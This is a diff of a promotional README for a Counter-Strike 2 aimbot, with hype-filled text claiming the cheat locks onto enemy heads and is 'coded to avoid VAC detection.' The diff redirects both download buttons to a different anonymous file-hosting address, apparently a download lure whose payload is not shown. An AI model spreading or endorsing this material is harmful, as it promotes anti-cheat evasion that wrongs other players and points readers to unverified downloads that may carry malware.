@@ -2,14 +2,14 @@
 
 Tired of whiffing your shots while the enemy lands every headshot? Welcome to the dark side—where **Counter-Strike 2 Aimbot** gives you pixel-perfect accuracy, lightning-fast flicks, and the kind of game sense that looks straight-up divine. Whether you're playing chill MM or sweaty Faceit, this tool is gonna turn you from silver-tier aim to full-on aim demon 😈.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/cs2/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 💡 What Is CS2 Aimbot?
 
 The **CS2 Aimbot** is a next-level aiming assistant built into a cheat framework for **Counter-Strike 2**. It automatically locks your crosshair to enemy heads or bodies based on your settings. You can go full rage and insta-flick everyone, or dial it down to look super legit with smooth aiming and FOV circles. It’s fully customizable, stealthy, and coded to avoid VAC detection. 👀
 
-[![Download Aimbot](https://eazycheats.net/images/external-free-cs2-cheat.png)](https://wecheaters.github.io/cheats/cs2/)
+[![Download Aimbot](https://eazycheats.net/images/external-free-cs2-cheat.png)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🚀 Key Features of CS2 Aimbot
